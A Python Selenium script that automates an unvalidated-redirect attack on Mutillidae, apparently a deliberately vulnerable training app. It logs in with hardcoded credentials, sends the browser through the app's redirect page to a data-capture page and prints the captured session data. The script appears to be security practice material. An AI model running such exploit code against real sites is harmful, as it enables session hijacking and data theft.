#!/usr/bin/env python

from selenium import webdriver
from bs4 import BeautifulSoup
from pywebfuzz import encoderlib
import time
import optparse

class UnvalidatedRedirectsAndForwardsAttack():
	login = "john"
	passwd = "monkey"
	page = "/capture-data.php"

	def __init__(self, url):	
		self.url = url		
		try:	
			useragent = "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25"
			profile = webdriver.FirefoxProfile()
			profile.set_preference("general.useragent.override",useragent)
			self.browser = webdriver.Firefox(profile)
		except Exception, e:
			print " [!] Browser object creation error:", e

	def __wait(self):
		time.sleep(2)

	def close(self):
		self.browser.close()
		
	def attack(self):
		if self.browser == None:
			return
		try:	
			login_page = self.url+"/index.php?page=login.php"
			print " [-] Openning login page at '%s'\n"%login_page
			self.browser.get(login_page)
			self.__wait()

			print " [-] Trying to login as '%s'\n"%UnvalidatedRedirectsAndForwardsAttack.login
			uname = self.browser.find_element_by_name("username")
			passwd = self.browser.find_element_by_name("password")
			btn = self.browser.find_element_by_name("login-php-submit-button")

			uname.send_keys(UnvalidatedRedirectsAndForwardsAttack.login)
			passwd.send_keys(UnvalidatedRedirectsAndForwardsAttack.passwd)
			btn.click()
			
			bad_page = encoderlib.full_url_encode(self.url+UnvalidatedRedirectsAndForwardsAttack.page)
			redirect_page = self.url+"/index.php?page=redirectandlog.php&forwardurl="+bad_page
			print " [-] Openning url '%s'"%redirect_page, "["+self.url+UnvalidatedRedirectsAndForwardsAttack.page+"]\n"
			self.browser.get(redirect_page)
			self.__wait()

			page_src = self.browser.page_source
			soup = BeautifulSoup(page_src, "lxml")
			
			captured = soup.find("th").get_text()

			print " [*] Captured session data:\n"
			print captured
			
		except Exception, e:
			print " [!] Attack was not successfull, error:", e
			
			
def main():
	parser = optparse.OptionParser("Usage: %prog -u <url> or %prog --url=<url>")
	parser.add_option("-u", "--url", dest="url", help="mutillidae home")
	options, args = parser.parse_args()
	if options.url == None:
		parser.print_help()
		sys.exit(0)
	
	attacker = UnvalidatedRedirectsAndForwardsAttack(options.url)
	attacker.attack()
	attacker.close()

if __name__ == "__main__":
	main()				
